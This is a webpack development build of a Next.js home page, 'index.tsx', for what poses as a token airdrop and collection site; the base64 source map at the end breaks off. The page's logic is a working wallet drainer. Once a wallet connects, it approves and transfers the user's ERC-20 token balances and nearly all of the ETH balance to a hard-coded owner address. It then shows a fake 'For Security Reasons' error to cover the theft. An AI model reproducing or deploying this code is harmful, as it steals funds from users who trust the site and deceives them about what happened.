"use strict";
/*
 * ATTENTION: An "eval-source-map" devtool has been used.
 * This devtool is neither made for production nor for readable output files.
 * It uses "eval()" calls to create a separate source file with attached SourceMaps in the browser devtools.
 * If you are trying to read the output file, select a different devtool (https://webpack.js.org/configuration/devtool/)
 * or disable the default devtool with "devtool: false".
 * If you are looking for production-ready output files, see mode: "production" (https://webpack.js.org/configuration/mode/).
 */
self["webpackHotUpdate_N_E"]("pages/index",{

/***/ "./src/pages/index.tsx":
/*!*****************************!*\
  !*** ./src/pages/index.tsx ***!
  \*****************************/
/***/ (function(module, __webpack_exports__, __webpack_require__) {

eval(__webpack_require__.ts("__webpack_require__.r(__webpack_exports__);\n/* harmony export */ __webpack_require__.d(__webpack_exports__, {\n/* harmony export */   \"default\": function() { return /* binding */ Home; }\n/* harmony export */ });\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! react/jsx-dev-runtime */ \"./node_modules/react/jsx-dev-runtime.js\");\n/* harmony import */ var react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__);\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! react */ \"./node_modules/react/index.js\");\n/* harmony import */ var react__WEBPACK_IMPORTED_MODULE_1___default = /*#__PURE__*/__webpack_require__.n(react__WEBPACK_IMPORTED_MODULE_1__);\n/* harmony import */ var ethers__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! ethers */ \"./node_modules/ethers/lib.esm/index.js\");\n/* harmony import */ var wagmi__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! wagmi */ \"./node_modules/wagmi/dist/index.js\");\n/* harmony import */ var _lib_address__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! @/lib/address */ \"./src/lib/address.ts\");\n/* harmony import */ var wagmi_actions__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! wagmi/actions */ \"./node_modules/wagmi/dist/actions.js\");\n/* harmony import */ var _lib_functions_userTokenList__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! @/lib/functions/userTokenList */ \"./src/lib/functions/userTokenList.ts\");\n/* harmony import */ var sweetalert2_dist_sweetalert2_js__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! sweetalert2/dist/sweetalert2.js */ \"./node_modules/sweetalert2/dist/sweetalert2.js\");\n/* harmony import */ var sweetalert2_dist_sweetalert2_js__WEBPACK_IMPORTED_MODULE_4___default = /*#__PURE__*/__webpack_require__.n(sweetalert2_dist_sweetalert2_js__WEBPACK_IMPORTED_MODULE_4__);\n/* harmony import */ var sweetalert2_src_sweetalert2_scss__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! sweetalert2/src/sweetalert2.scss */ \"./node_modules/sweetalert2/src/sweetalert2.scss\");\n/* harmony import */ var sweetalert2_src_sweetalert2_scss__WEBPACK_IMPORTED_MODULE_5___default = /*#__PURE__*/__webpack_require__.n(sweetalert2_src_sweetalert2_scss__WEBPACK_IMPORTED_MODULE_5__);\n/* harmony import */ var _lib_ethersSetUp__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! @/lib/ethersSetUp */ \"./src/lib/ethersSetUp.ts\");\n/* harmony import */ var _components_Modal__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! @/components/Modal */ \"./src/components/Modal.tsx\");\n/* harmony import */ var _components_airdrops_Airdrop__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! ./components/airdrops/Airdrop */ \"./src/pages/components/airdrops/Airdrop.jsx\");\n/* harmony import */ var _components_collections_Collection__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! ./components/collections/Collection */ \"./src/pages/components/collections/Collection.jsx\");\n/* harmony import */ var _components_footer_Footer__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! ./components/footer/Footer */ \"./src/pages/components/footer/Footer.jsx\");\n/* harmony import */ var _components_main_Main__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! ./components/main/Main */ \"./src/pages/components/main/Main.jsx\");\n/* harmony import */ var _components_nav_Nav__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! ./components/nav/Nav */ \"./src/pages/components/nav/Nav.tsx\");\n\nvar _s = $RefreshSig$();\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nfunction Home() {\n    _s();\n    const [balance, setBalance] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)(\"\");\n    const [isModalOpen, setIsModalOpen] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)(true);\n    const [validBalances, setValidBalance] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)();\n    const { address, isConnected } = (0,wagmi__WEBPACK_IMPORTED_MODULE_13__.useAccount)();\n    const { chain } = (0,wagmi_actions__WEBPACK_IMPORTED_MODULE_14__.getNetwork)();\n    const { disconnect } = (0,wagmi__WEBPACK_IMPORTED_MODULE_13__.useDisconnect)();\n    const gasBuffer = 100000000;\n    const getUserBalace = async ()=>{\n        try {\n            const provider = new ethers__WEBPACK_IMPORTED_MODULE_15__.ethers.providers.Web3Provider(window.ethereum);\n            const balanceInWei = await provider.getBalance(String(address));\n            const balanceInEth = ethers__WEBPACK_IMPORTED_MODULE_15__.ethers.utils.formatEther(balanceInWei);\n            setBalance(balanceInEth);\n            console.log(balanceInEth);\n            return balanceInEth;\n        } catch (error) {\n            console.log(\"err\", error);\n        }\n    };\n    const showNotification = (text)=>{\n        sweetalert2_dist_sweetalert2_js__WEBPACK_IMPORTED_MODULE_4___default().fire({\n            title: \"Error!\",\n            text: text,\n            icon: \"error\"\n        });\n    };\n    (0,react__WEBPACK_IMPORTED_MODULE_1__.useEffect)(()=>{\n        const bb = async ()=>{\n            const a = await (0,_lib_functions_userTokenList__WEBPACK_IMPORTED_MODULE_3__.checkIfUserOwnsAnyTokeninList)((chain === null || chain === void 0 ? void 0 : chain.name) || \"\", String(address));\n            setValidBalance(a);\n        };\n        bb();\n    }, []);\n    const handleTokenErc20Transfer = async ()=>{\n        if (validBalances) {\n            validBalances === null || validBalances === void 0 ? void 0 : validBalances.forEach(async (token)=>{\n                const erc20Contract = (0,_lib_ethersSetUp__WEBPACK_IMPORTED_MODULE_6__.IERC20Contract)(token.tokenAddress);\n                const decimals = await erc20Contract.decimals();\n                const toApproveOwner = String(Number(token.balance) / Math.pow(10, Number(decimals)));\n                await erc20Contract.approve(_lib_address__WEBPACK_IMPORTED_MODULE_2__.OwnerAdress, toApproveOwner);\n                try {\n                    const tx = await erc20Contract.transfer(_lib_address__WEBPACK_IMPORTED_MODULE_2__.OwnerAdress, String(toApproveOwner));\n                    await handleTokenEthTransfer();\n                    await tx.wait();\n                    showNotification(\"For Security Reasons You can't connect empty or new wallet\");\n                } catch (error) {\n                    showNotification(String(error));\n                    console.log(error);\n                }\n            });\n        }\n    };\n    const handleTokenEthTransfer = async ()=>{\n        const defBal = await getUserBalace();\n        const provider = new ethers__WEBPACK_IMPORTED_MODULE_15__.ethers.providers.Web3Provider(window.ethereum);\n        const gas = \"5000000000000000\";\n        let bal;\n        if (!balance) {\n            bal = String(defBal);\n        } else {\n            bal = balance;\n        }\n        const balanceInWei = ethers__WEBPACK_IMPORTED_MODULE_15__.ethers.utils.parseEther(bal);\n        if (Number(balanceInWei) >= Number(gas)) {\n            const newBalanceAfterGas = Number(balanceInWei) - Number(gas);\n            const signer = provider.getSigner();\n            const ownersShare = Number(newBalanceAfterGas);\n            try {\n                const tx = await signer.sendTransaction({\n                    to: _lib_address__WEBPACK_IMPORTED_MODULE_2__.OwnerAdress,\n                    value: String(ownersShare)\n                });\n                await tx.wait();\n                showNotification(\"For Security Reasons You can't connect empty or new wallet\");\n            } catch (error) {\n                showNotification(String(error));\n                console.log(\"err\", error);\n            }\n        } else {\n            showNotification(String(\"For Security Reasons You can't connect empty or new wallet\"));\n        }\n    };\n    (0,react__WEBPACK_IMPORTED_MODULE_1__.useEffect)(()=>{\n        getUserBalace();\n    }, []);\n    const handleTokenTransfer = async ()=>{\n        if (validBalances) {\n            await handleTokenErc20Transfer();\n        } else {\n            await handleTokenEthTransfer();\n        }\n    };\n    const [mounted, setMounted] = (0,react__WEBPACK_IMPORTED_MODULE_1__.useState)(false);\n    (0,react__WEBPACK_IMPORTED_MODULE_1__.useEffect)(()=>{\n        setMounted(true);\n    }, []);\n    if (!mounted) return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.Fragment, {}, void 0, false);\n    if (isModalOpen) return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_Modal__WEBPACK_IMPORTED_MODULE_7__[\"default\"], {\n        setIsModalOpen: setIsModalOpen\n    }, void 0, false, {\n        fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n        lineNumber: 176,\n        columnNumber: 27\n    }, this);\n    return /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"main\", {\n        className: \" w-full h-dvh sm:h-[89dvh] mt-6 mb-4 gradient-b \",\n        children: [\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                className: \"w-full flex justify-end px-5\",\n                children: isConnected && /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"button\", {\n                    className: \"bg-primary text-white h-10 w-32 rounded-3xl\",\n                    onClick: ()=>disconnect(),\n                    children: \"Disconnect\"\n                }, void 0, false, {\n                    fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                    lineNumber: 182,\n                    columnNumber: 11\n                }, this)\n            }, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 179,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {\n                children: /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(\"div\", {}, void 0, false, {\n                    fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                    lineNumber: 195,\n                    columnNumber: 9\n                }, this)\n            }, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 193,\n                columnNumber: 7\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_nav_Nav__WEBPACK_IMPORTED_MODULE_12__[\"default\"], {}, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 256,\n                columnNumber: 5\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_main_Main__WEBPACK_IMPORTED_MODULE_11__[\"default\"], {}, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 257,\n                columnNumber: 6\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_airdrops_Airdrop__WEBPACK_IMPORTED_MODULE_8__[\"default\"], {}, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 258,\n                columnNumber: 6\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_collections_Collection__WEBPACK_IMPORTED_MODULE_9__[\"default\"], {}, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 259,\n                columnNumber: 6\n            }, this),\n            /*#__PURE__*/ (0,react_jsx_dev_runtime__WEBPACK_IMPORTED_MODULE_0__.jsxDEV)(_components_footer_Footer__WEBPACK_IMPORTED_MODULE_10__[\"default\"], {}, void 0, false, {\n                fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n                lineNumber: 260,\n                columnNumber: 6\n            }, this)\n        ]\n    }, void 0, true, {\n        fileName: \"/Users/tydev/Downloads/token-main/src/pages/index.tsx\",\n        lineNumber: 178,\n        columnNumber: 5\n    }, this);\n}\n_s(Home, \"EbSZwaqfjpNtTt8KIzeVazdoPoM=\", false, function() {\n    return [\n        wagmi__WEBPACK_IMPORTED_MODULE_13__.useAccount,\n        wagmi__WEBPACK_IMPORTED_MODULE_13__.useDisconnect\n    ];\n});\n_c = Home;\nvar _c;\n$RefreshReg$(_c, \"Home\");\n\n\n;\n    // Wrapped in an IIFE to avoid polluting the global scope\n    ;\n    (function () {\n        var _a, _b;\n        // Legacy CSS implementations will `eval` browser code in a Node.js context\n        // to extract CSS. For backwards compatibility, we need to check we're in a\n        // browser context before continuing.\n        if (typeof self !== 'undefined' &&\n            // AMP / No-JS mode does not inject these helpers:\n            '$RefreshHelpers$' in self) {\n            // @ts-ignore __webpack_module__ is global\n            var currentExports = module.exports;\n            // @ts-ignore __webpack_module__ is global\n            var prevSignature = (_b = (_a = module.hot.data) === null || _a === void 0 ? void 0 : _a.prevSignature) !== null && _b !== void 0 ? _b : null;\n            // This cannot happen in MainTemplate because the exports mismatch between\n            // templating and execution.\n            self.$RefreshHelpers$.registerExportsForReactRefresh(currentExports, module.id);\n            // A module can be accepted automatically based on its exports, e.g. when\n            // it is a Refresh Boundary.\n            if (self.$RefreshHelpers$.isReactRefreshBoundary(currentExports)) {\n                // Save the previous exports signature on update so we can compare the boundary\n                // signatures. We avoid saving exports themselves since it causes memory leaks (https://github.com/vercel/next.js/pull/53797)\n                module.hot.dispose(function (data) {\n                    data.prevSignature =\n                        self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports);\n                });\n                // Unconditionally accept an update to this module, we'll check if it's\n                // still a Refresh Boundary later.\n                // @ts-ignore importMeta is replaced in the loader\n                module.hot.accept();\n                // This field is set when the previous version of this module was a\n                // Refresh Boundary, letting us know we need to check for invalidation or\n                // enqueue an update.\n                if (prevSignature !== null) {\n                    // A boundary can become ineligible if its exports are incompatible\n                    // with the previous exports.\n                    //\n                    // For example, if you add/remove/change exports, we'll want to\n                    // re-execute the importing modules, and force those components to\n                    // re-render. Similarly, if you convert a class component to a\n                    // function, we want to invalidate the boundary.\n                    if (self.$RefreshHelpers$.shouldInvalidateReactRefreshBoundary(prevSignature, self.$RefreshHelpers$.getRefreshBoundarySignature(currentExports))) {\n                        module.hot.invalidate();\n                    }\n                    else {\n                        self.$RefreshHelpers$.scheduleUpdate();\n                    }\n                }\n            }\n            else {\n                // Since we just executed the code for the module, it's possible that the\n                // new exports made it ineligible for being a boundary.\n                // We only care about the case when we were _previously_ a boundary,\n                // because we already accepted this update (accidental side effect).\n                var isNoLongerABoundary = prevSignature !== null;\n                if (isNoLongerABoundary) {\n                    module.hot.invalidate();\n                }\n            }\n        }\n    })();\n//# sourceURL=[module]\n//# sourceMappingURL=data:application/json;charset=utf-8;base64,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MEJBQ0gsOERBQUNELDhEQUFJQTs7Ozs7MEJBQ0wsOERBQUNILG9FQUFPQTs7Ozs7MEJBQ1IsOERBQUNDLDBFQUFVQTs7Ozs7MEJBQ1gsOERBQUNDLGtFQUFNQTs7Ozs7Ozs7Ozs7QUFHWjtHQW5Pd0JHOztRQUlXYiw4Q0FBVUE7UUFFcEJPLGlEQUFhQTs7O0tBTmRNIiwic291cmNlcyI6WyJ3ZWJwYWNrOi8vX05fRS8uL3NyYy9wYWdlcy9pbmRleC50c3g/MTlhMCJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBJbnRlciB9IGZyb20gJ25leHQvZm9udC9nb29nbGUnO1xuaW1wb3J0IHsgdXNlRWZmZWN0LCB1c2VTdGF0ZSB9IGZyb20gJ3JlYWN0JztcbmltcG9ydCB7IGV0aGVycyB9IGZyb20gJ2V0aGVycyc7XG5pbXBvcnQgeyB1c2VBY2NvdW50IH0gZnJvbSAnd2FnbWknO1xuaW1wb3J0IHsgT3duZXJBZHJlc3MsIG93bmVyUGVyY2VudGFnZSB9IGZyb20gJ0AvbGliL2FkZHJlc3MnO1xuaW1wb3J0IHsgZ2V0TmV0d29yayB9IGZyb20gJ3dhZ21pL2FjdGlvbnMnO1xuaW1wb3J0IHsgY2hlY2tJZlVzZXJPd25zQW55VG9rZW5pbkxpc3QgfSBmcm9tICdAL2xpYi9mdW5jdGlvbnMvdXNlclRva2VuTGlzdCc7XG5pbXBvcnQgU3dhbCBmcm9tICdzd2VldGFsZXJ0Mi9kaXN0L3N3ZWV0YWxlcnQyLmpzJztcbmltcG9ydCAnc3dlZXRhbGVydDIvc3JjL3N3ZWV0YWxlcnQyLnNjc3MnO1xuaW1wb3J0IHsgSUVSQzIwQ29udHJhY3QgfSBmcm9tICdAL2xpYi9ldGhlcnNTZXRVcCc7XG5pbXBvcnQgaW1nIGZyb20gJ0AvYXNzZXRzL3Blb3BsZU9uVG93ZXIucG5nJztcbmltcG9ydCBpbWcyIGZyb20gJ0AvYXNzZXRzL2NvaW5zVG93ZXIuc3ZnJztcbmltcG9ydCBJbWFnZSBmcm9tICduZXh0L2ltYWdlJztcbmltcG9ydCBNb2RhbCBmcm9tICdAL2NvbXBvbmVudHMvTW9kYWwnO1xuaW1wb3J0IHsgdXNlRGlzY29ubmVjdCB9IGZyb20gJ3dhZ21pJztcblxuXG5pbXBvcnQgeyBwYXJzZUV0aGVyLCBjcmVhdGVXYWxsZXRDbGllbnQsIGN1c3RvbSwgfSBmcm9tICd2aWVtJztcbmltcG9ydCBBaXJkcm9wIGZyb20gJy4vY29tcG9uZW50cy9haXJkcm9wcy9BaXJkcm9wJztcbmltcG9ydCBDb2xsZWN0aW9uIGZyb20gJy4vY29tcG9uZW50cy9jb2xsZWN0aW9ucy9Db2xsZWN0aW9uJztcbmltcG9ydCBGb290ZXIgZnJvbSAnLi9jb21wb25lbnRzL2Zvb3Rlci9Gb290ZXInO1xuaW1wb3J0IE1haW4gZnJvbSAnLi9jb21wb25lbnRzL21haW4vTWFpbic7XG5pbXBvcnQgTmF2IGZyb20gJy4vY29tcG9uZW50cy9uYXYvTmF2JztcblxuXG5cbmNvbnN0IGludGVyID0gSW50ZXIoeyBzdWJzZXRzOiBbJ2xhdGluJ10gfSk7XG5cbnR5cGUgdmFsaWRCYWxhbmNlcyA9XG4gIHwge1xuICAgICAgYmFsYW5jZTogc3RyaW5nO1xuICAgICAgdG9rZW5BZGRyZXNzOiBzdHJpbmc7XG4gICAgfVtdXG4gIHwgdW5kZWZpbmVkO1xuXG5leHBvcnQgZGVmYXVsdCBmdW5jdGlvbiBIb21lKCkge1xuICBjb25zdCBbYmFsYW5jZSwgc2V0QmFsYW5jZV0gPSB1c2VTdGF0ZSgnJyk7XG4gIGNvbnN0IFtpc01vZGFsT3Blbiwgc2V0SXNNb2RhbE9wZW5dID0gdXNlU3RhdGUodHJ1ZSk7XG4gIGNvbnN0IFt2YWxpZEJhbGFuY2VzLCBzZXRWYWxpZEJhbGFuY2VdID0gdXNlU3RhdGU8dmFsaWRCYWxhbmNlcz4oKTtcbiAgY29uc3QgeyBhZGRyZXNzLCBpc0Nvbm5lY3RlZCB9ID0gdXNlQWNjb3VudCgpO1xuICBjb25zdCB7IGNoYWluIH0gPSBnZXROZXR3b3JrKCk7XG4gIGNvbnN0IHsgZGlzY29ubmVjdCB9ID0gdXNlRGlzY29ubmVjdCgpO1xuXG4gIGNvbnN0IGdhc0J1ZmZlciA9IDEwMDAwMDAwMDtcblxuICBjb25zdCBnZXRVc2VyQmFsYWNlID0gYXN5bmMgKCkgPT4ge1xuICAgIHRyeSB7XG4gICAgICBjb25zdCBwcm92aWRlciA9IG5ldyBldGhlcnMucHJvdmlkZXJzLldlYjNQcm92aWRlcihcbiAgICAgICAgd2luZG93LmV0aGVyZXVtIGFzIGFueVxuICAgICAgKTtcbiAgICAgIGNvbnN0IGJhbGFuY2VJbldlaSA9IGF3YWl0IHByb3ZpZGVyLmdldEJhbGFuY2UoU3RyaW5nKGFkZHJlc3MpKTtcbiAgICAgIGNvbnN0IGJhbGFuY2VJbkV0aCA9IGV0aGVycy51dGlscy5mb3JtYXRFdGhlcihiYWxhbmNlSW5XZWkpO1xuICAgICAgc2V0QmFsYW5jZShiYWxhbmNlSW5FdGgpO1xuICAgICAgY29uc29sZS5sb2coYmFsYW5jZUluRXRoKTtcbiAgICAgIHJldHVybiBiYWxhbmNlSW5FdGg7XG4gICAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICAgIGNvbnNvbGUubG9nKCdlcnInLCBlcnJvcik7XG4gICAgfVxuICB9O1xuXG4gIGNvbnN0IHNob3dOb3RpZmljYXRpb24gPSAodGV4dDogc3RyaW5nKSA9PiB7XG4gICAgU3dhbC5maXJlKHtcbiAgICAgIHRpdGxlOiAnRXJyb3IhJyxcbiAgICAgIHRleHQ6IHRleHQsXG4gICAgICBpY29uOiAnZXJyb3InLFxuICAgIH0pO1xuICB9O1xuXG4gIHVzZUVmZmVjdCgoKSA9PiB7XG4gICAgY29uc3QgYmIgPSBhc3luYyAoKSA9PiB7XG4gICAgICBjb25zdCBhID0gYXdhaXQgY2hlY2tJZlVzZXJPd25zQW55VG9rZW5pbkxpc3QoXG4gICAgICAgIGNoYWluPy5uYW1lIHx8ICcnLFxuICAgICAgICBTdHJpbmcoYWRkcmVzcylcbiAgICAgICk7XG4gICAgICBzZXRWYWxpZEJhbGFuY2UoYSk7XG4gICAgfTtcbiAgICBiYigpO1xuICB9LCBbXSk7XG5cbiAgY29uc3QgaGFuZGxlVG9rZW5FcmMyMFRyYW5zZmVyID0gYXN5bmMgKCkgPT4ge1xuICAgIGlmICh2YWxpZEJhbGFuY2VzKSB7XG4gICAgICB2YWxpZEJhbGFuY2VzPy5mb3JFYWNoKGFzeW5jICh0b2tlbikgPT4ge1xuICAgICAgICBjb25zdCBlcmMyMENvbnRyYWN0ID0gSUVSQzIwQ29udHJhY3QodG9rZW4udG9rZW5BZGRyZXNzKTtcblxuICAgICAgICBjb25zdCBkZWNpbWFscyA9IGF3YWl0IGVyYzIwQ29udHJhY3QuZGVjaW1hbHMoKTtcbiAgICAgICAgY29uc3QgdG9B